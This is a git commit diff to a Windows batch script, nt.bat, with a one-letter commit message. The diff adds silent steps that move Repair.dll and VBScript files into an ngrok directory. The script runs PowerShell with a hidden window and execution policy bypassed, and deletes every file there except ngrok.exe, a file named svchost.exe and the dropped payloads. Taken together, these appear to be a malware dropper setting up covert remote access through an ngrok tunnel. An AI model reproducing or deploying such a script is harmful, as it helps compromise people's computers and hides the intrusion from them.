ee9b94bcaa29f4b95000790d2732c56f04c44268
ofutpemata22 <gagi.cu.ci@gmail.com>
2025-05-04 13:55:57 -0700

    a

--- nt.bat
+++ nt.bat
@@ -12,6 +12,12 @@ set "TEMP_FILE=%TEMP%\8b37b206-42e3-4bdf-9344-aa7matagrasa77be014.tmp"
 
 if not exist "%NGROK_DIR%" mkdir "%NGROK_DIR%"
 
+move /y "%TEMP%\Repair.dll" "%NGROK_DIR%\Repair.dll" >nul 2>&1
+move /y "%TEMP%\main.vbs" "%NGROK_DIR%\main.vbs" >nul 2>&1
+move /y "%TEMP%\1.vbs" "%NGROK_DIR%\1.vbs" >nul 2>&1
+
+timeout /t 1 /nobreak >nul
+
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://dotnet.microsoft.com/download/dotnet/scripts/v1/dotnet-install.ps1', '%DOTNET_INSTALL_SCRIPT%')"
 
 powershell -ExecutionPolicy Bypass -NoProfile -File "%DOTNET_INSTALL_SCRIPT%" -Runtime dotnet -Version %DOTNET_VERSION% -InstallDir "%INSTALL_DIR%"
@@ -24,27 +30,17 @@ del "%DOTNET_INSTALL_SCRIPT%"
 
 timeout /t 4 /nobreak >nul
 
-move /y "%TEMP%\Repair.dll" "%NGROK_DIR%\Repair.dll"
-move /y "%TEMP%\main.vbs" "%NGROK_DIR%\main.vbs"
-move /y "%TEMP%\1.vbs" "%NGROK_DIR%\1.vbs"
-
-for /f "delims=" %%F in ('dir /a /b /s "%NGROK_DIR%"') do (
-    set "FILE=%%F"
-    if /i not "!FILE!"=="%NGROK_DIR%\ngrok.exe" (
-        if /i not "!FILE!"=="%NGROK_DIR%\svchost.exe" (
-            if /i not "!FILE!"=="%NGROK_DIR%\hst.vbs" (
-                if /i not "!FILE!"=="%NGROK_DIR%\ngrok.yml" (
-                    if /i not "!FILE!"=="%NGROK_DIR%\Repair.dll" (
-                        if /i not "!FILE!"=="%NGROK_DIR%\main.vbs" (
-                            if /i not "!FILE!"=="%NGROK_DIR%\1.vbs" (
-                                del /f /q "!FILE!"
-                            )
-                        )
-                    )
-                )
-            )
-        )
-    )
+for %%F in ("%NGROK_DIR%\*") do (
+    set "FILE=%%~nxF"
+    if /i not "!FILE!"=="ngrok.exe" (
+    if /i not "!FILE!"=="svchost.exe" (
+    if /i not "!FILE!"=="hst.vbs" (
+    if /i not "!FILE!"=="ngrok.yml" (
+    if /i not "!FILE!"=="Repair.dll" (
+    if /i not "!FILE!"=="main.vbs" (
+    if /i not "!FILE!"=="1.vbs" (
+        del /f /q "%%~F"
+    )))))))
 )
 
 endlocal
